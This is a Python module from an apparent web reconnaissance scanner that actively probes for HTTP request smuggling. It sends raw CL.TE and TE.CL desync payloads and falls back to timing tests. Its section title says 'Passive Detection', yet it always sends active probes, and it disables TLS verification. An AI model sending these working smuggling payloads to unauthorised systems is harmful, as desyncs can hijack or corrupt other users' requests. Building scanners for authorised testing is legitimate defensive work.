"""
SmugglingModule — YATA RECON module.
"""
import re
import secrets
import time
import urllib.parse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from recon.modules import BaseModule


class SmugglingModule(BaseModule):
    NAME = "HTTP Smuggling"

    def run(self):
        self.ui.section("HTTP Request Smuggling — Passive Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        # Passive: check for proxy/load balancer headers that may indicate vuln infra
        resp = self._get(self.base_url)
        if resp is None:
            return

        h = {k.lower(): v for k, v in resp.headers.items()}
        proxy_indicators = ["x-forwarded-for", "via", "x-varnish", "x-cache",
                            "cf-ray", "x-amz-cf-id", "x-cdn"]
        has_proxy = any(p in h for p in proxy_indicators)

        if has_proxy:
            self.ui.info("Proxy infrastructure detected — initiating active smuggling probes...")
            self._probe_smuggling()
        else:
            self.ui.info("No proxy layer detected — smuggling risk lower, but testing anyway...")
            self._probe_smuggling()
            
    def _probe_smuggling(self):
        """
        Active HTTP request smuggling probing: a direct raw-socket
        differential-response prober first (proof, not inference — see
        _differential_desync_probe), falling back to the older timing-based
        heuristic only when the differential test can't establish a clean
        confirmation on this particular front-end/back-end pairing.
        """
        import socket
        import ssl
        from urllib.parse import urlparse

        parsed = urlparse(self.base_url)
        host = parsed.netloc
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'

        # ── Differential response-queue desync probe (direct proof) ────────
        cl_te_diff = self._differential_desync_probe(host, port, use_ssl, mode="CL.TE")
        te_cl_diff = None
        if not cl_te_diff:
            time.sleep(self.delay)
            te_cl_diff = self._differential_desync_probe(host, port, use_ssl, mode="TE.CL")

        if cl_te_diff:
            self._report_confirmed("CL.TE", cl_te_diff)
            return
        if te_cl_diff:
            self._report_confirmed("TE.CL", te_cl_diff)
            return

        time.sleep(self.delay)
        self._probe_timing(host, port, use_ssl)

    def _differential_desync_probe(self, host, port, use_ssl, mode="CL.TE"):
        """
        Raw-socket response-queue desync confirmation — direct proof instead
        of a timing guess. We smuggle a bogus GET request for a random,
        guaranteed-404 path into the tail of a request body that the
        front-end and back-end will parse with DIFFERENT framing rules
        (Content-Length vs. Transfer-Encoding). If the back-end is desynced,
        that smuggled GET sits queued in its buffer; the very next request we
        send down the SAME connection gets answered with the response meant
        for OUR smuggled request instead of its own — which we can directly
        observe, because our random marker path comes back in the response
        body/status for a request that never asked for it. That is a
        deterministic proof: it cannot happen on a correctly-synced
        connection no matter how slow or jittery the network is, which is
        exactly the ambiguity a pure timing measurement can never rule out.
        """
        import socket
        import ssl

        marker = f"grsmuggle{secrets.token_hex(5)}"
        smuggled_path = f"/{marker}"

        if mode == "CL.TE":
            # Front-end reads by Content-Length (the WHOLE body, including
            # the smuggled tail); back-end reads by Transfer-Encoding and
            # stops at the "0\r\n\r\n" terminator, leaving our smuggled GET
            # sitting in its buffer as the start of the next request.
            chunked_body = "0\r\n\r\n"
            smuggled_tail = f"GET {smuggled_path} HTTP/1.1\r\nX-Ignore: x\r\n\r\n"
            full_body = chunked_body + smuggled_tail
            req1 = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(chunked_body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{full_body}"
            ).encode()
        else:  # TE.CL
            # Front-end dechunks (Transfer-Encoding) and forwards a single,
            # properly-framed request; back-end reads by Content-Length,
            # which we declare short enough that only the chunk-size line
            # is consumed — everything after it (our smuggled GET) is left
            # for the back-end to treat as the start of the next request.
            smuggled_body = "x=1&y=1"
            smuggled_req = (
                f"GET {smuggled_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(smuggled_body)}\r\n"
                f"\r\n"
                f"{smuggled_body}"
            )
            chunk_size_hex = format(len(smuggled_req), 'x')
            cl_declared = len(chunk_size_hex) + 2  # bytes of "<hex>\r\n" the back-end (CL) consumes
            body = f"{chunk_size_hex}\r\n{smuggled_req}\r\n0\r\n\r\n"
            req1 = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {cl_declared}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{body}"
            ).encode()

        req2 = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        try:
            sock = socket.create_connection((host, port), timeout=10)
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.sendall(req1)
            # Give the front-end time to forward req1 and the back-end time
            # to queue the smuggled tail before we send the probe request.
            time.sleep(1.0)
            sock.sendall(req2)
            time.sleep(1.5)

            sock.settimeout(6)
            resp = b""
            try:
                while len(resp) < 65536:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    resp += chunk
            except socket.timeout:
                pass
            sock.close()
        except Exception:
            return None

        text = resp.decode("utf-8", errors="replace")
        if marker not in text:
            return None

        # The marker showing up at all in the response to a request that
        # asked for '/' already means the back-end answered with something
        # meant for our smuggled request. Requiring it to also look like a
        # 404/error response for that bogus path rules out a server that
        # happens to reflect request bytes for an unrelated reason (e.g. an
        # error-diagnostics page that echoes raw input).
        status_line = text.split("\r\n", 1)[0]
        looks_like_error_for_smuggled_path = (
            "404" in status_line or "400" in status_line or "not found" in text.lower()
        )
        if looks_like_error_for_smuggled_path:
            return {"marker": marker, "raw_evidence": text[:800]}
        return None

    def _report_confirmed(self, kind, result):
        self.db.add(
            title=f"HTTP Request Smuggling ({kind}) — Response-Queue Desync Confirmed",
            severity="critical", url=self.base_url, module=self.NAME,
            description=(
                f"A raw {kind}-shaped smuggling payload was sent, immediately followed by an "
                f"unrelated normal request ('GET /') on the SAME connection. The response to "
                f"that normal request instead contained our smuggled request's own random "
                f"marker path ('{result['marker']}'), proving the connection is desynced: the "
                f"front-end and back-end disagree on where one request ends and the next "
                f"begins ({kind} — one hop trusts Content-Length, the other Transfer-Encoding). "
                "This is a direct observation, not a timing inference — a real attacker can "
                "queue arbitrary smuggled requests onto other users' connections."
            ),
            remediation=(
                "Ensure front-end and back-end servers consistently parse Transfer-Encoding and "
                "Content-Length headers (reject requests with both, or normalize at the edge). "
                "Prefer HTTP/2 end-to-end, or disable connection reuse between front-end and "
                "back-end to eliminate desync opportunities entirely."
            ),
            cvss="9.1",
            confidence="CONFIRMED",
            confidence_score=97,
            validation_steps=[f"{kind.lower().replace('.', '_')}_payload_sent",
                               "smuggled_marker_path_returned_for_unrelated_request",
                               "response_shape_matches_smuggled_path_error"],
            evidence=[f"Marker: {result['marker']}", f"Response excerpt: {result['raw_evidence'][:400]}"],
        )
        self.ui.find("critical", f"HTTP Smuggling ({kind}) — response-queue desync confirmed", self.base_url)

    def _probe_timing(self, host, port, use_ssl):
        """
        Fallback: time-based HTTP request smuggling probe, used only when
        the direct differential-response test above couldn't confirm a
        desync on this pairing. A single raw-socket delay is a weak signal
        on its own — plain network jitter, a slow backend, or a WAF
        rate-limit can all produce the same multi-second stall a real
        CL.TE/TE.CL desync would. To avoid reporting that as a "CONFIRMED
        critical" finding (this exact overconfidence pattern — a single
        unbounded timing sample with no baseline or repeat check — is what
        caused false positives in sqli.py's time-based detector earlier),
        this: (1) measures a normal-request baseline first, (2) requires the
        smuggling payload's delay to clear baseline by a wide margin AND hit
        the socket timeout (real desyncs hang until the backend gives up,
        they don't land at an arbitrary number), and (3) repeats the payload
        once to confirm before reporting — and even then caps confidence at
        HIGH, not CONFIRMED, with the evidence saying so plainly.
        """
        import socket
        import ssl

        # CL.TE Time-based payload (Content-Length is primary, Transfer-Encoding is secondary)
        # If frontend uses CL (reads all), backend uses TE (stops at 0), the extra 'X' gets queued
        cl_te_req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 4\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q\r\n"
        ).encode()

        # TE.CL Time-based payload
        # If frontend uses TE (stops at 0), backend uses CL (waits for 6 bytes), it waits for the 'X'
        te_cl_req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 6\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        ).encode()

        # A normal, correctly-framed request — used to measure baseline
        # latency so a slow-but-benign server doesn't get flagged.
        control_req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

        timeout_val = 10

        def send_raw(payload, timeout=timeout_val):
            try:
                sock = socket.create_connection((host, port), timeout=timeout)
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                t0 = time.time()
                sock.sendall(payload)
                sock.recv(4096)
                elapsed = time.time() - t0
                sock.close()
                return elapsed
            except socket.timeout:
                return timeout
            except Exception:
                return None

        # Baseline: normal request latency (median of 2, to smooth one-off jitter).
        baseline_samples = [t for t in (send_raw(control_req), send_raw(control_req)) if t is not None]
        baseline = sorted(baseline_samples)[len(baseline_samples) // 2] if baseline_samples else 0.5
        # A real desync hangs the connection until the server's own read
        # timeout, so we want a delay that both clears baseline by a wide
        # margin AND lands near our socket timeout — not just "somewhat slow".
        threshold = max(baseline * 3, baseline + 5, 6.0)

        def probe_and_confirm(payload, label):
            self.ui.info(f"Testing {label}...")
            t1 = send_raw(payload)
            if t1 is None or t1 < threshold:
                return None
            time.sleep(self.delay)
            self.ui.warn(f"{label} candidate ({t1:.1f}s vs baseline {baseline:.2f}s) — confirming...")
            t2 = send_raw(payload)
            if t2 is None or t2 < threshold:
                return None
            return (t1, t2)

        cl_te_result = probe_and_confirm(cl_te_req, "CL.TE")
        time.sleep(self.delay)
        te_cl_result = probe_and_confirm(te_cl_req, "TE.CL") if not cl_te_result else None

        def report(kind, result):
            t1, t2 = result
            self.db.add(
                title=f"HTTP Request Smuggling ({kind}) — Timing Indicator",
                severity="high", url=self.base_url, module=self.NAME,
                description=(
                    f"Two consecutive {kind}-shaped smuggling payloads both stalled "
                    f"({t1:.1f}s, {t2:.1f}s) well beyond the measured baseline latency "
                    f"({baseline:.2f}s), consistent with a front-end/back-end desync where "
                    f"one hop reads Content-Length and the other reads Transfer-Encoding. "
                    f"Timing alone cannot fully prove smuggling (network conditions and "
                    f"slow backends can also cause stalls) — manually confirm with a "
                    f"differential response-splitting payload (e.g. Burp's HTTP Request "
                    f"Smuggler) before treating this as exploitable."
                ),
                remediation="Ensure front-end and back-end servers consistently parse Transfer-Encoding and Content-Length headers. Prefer HTTP/2 for back-end connections to avoid smuggling.",
                cvss="7.5",
                confidence="HIGH",
                confidence_score=75,
                validation_steps=["baseline_measured", f"{kind.lower().replace('.', '_')}_timing_delay", "repeated_to_confirm"],
                evidence=[f"Baseline: {baseline:.2f}s", f"Probe 1: {t1:.2f}s", f"Probe 2: {t2:.2f}s",
                          f"Threshold: {threshold:.2f}s"],
            )
            self.ui.find("high", f"HTTP Smuggling ({kind}) — timing indicator", self.base_url)

        if cl_te_result:
            report("CL.TE", cl_te_result)
        elif te_cl_result:
            report("TE.CL", te_cl_result)
        else:
            self.ui.info("No time-based smuggling vulnerability detected.")


# ─── CORS Module ───────────────────────────────────────────────────────────────